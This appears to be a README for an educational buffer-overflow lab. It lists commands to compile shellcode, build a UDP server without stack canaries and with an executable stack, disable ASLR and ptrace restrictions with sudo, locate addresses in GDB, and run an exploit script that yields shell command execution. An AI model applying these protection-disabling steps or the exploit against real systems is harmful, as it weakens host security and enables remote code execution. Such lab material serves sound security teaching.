## Example: 
https://thesquareplanet.com/blog/smashing-the-stack-21st-century/ <br />


## Commands: <br />
Compile the shellcode:
```
cc -m64 -c -o shellcode.o shellcode.S
objcopy -S -O binary -j .text shellcode.o shellcode.bin
```
Compile the UDP server program without stack protection (canary) and allowing the stack to be executable:
```
gcc -g -fno-stack-protector -z execstack udp_server.c -o udp_server -D_FORTIFY_SOURCE=0
```
Turn off address randomization:
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Command to run without address randomization:
```
env - setarch -R ./udp_server
```
In another terminal, allow the program to be traced:
```
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```
Get the process id of the udp_server program and attach GDB to it:
```
gdb -p $(pgrep udp_server)
```
In GDB you want to set at break point at recvfrom, then get the address of the buffer and the return address:
```
b recvfrom
c
p &buffer
```
Write down the address where the buffer starts. Then look for the return address:
```
info frame
```
The return address is "rip at ...". Adjust the values in the Python script and run the exploit:
```
python3 exploit.py | env - setarch -R ./udp_server
```
You can start executing shell commands in the server terminal.
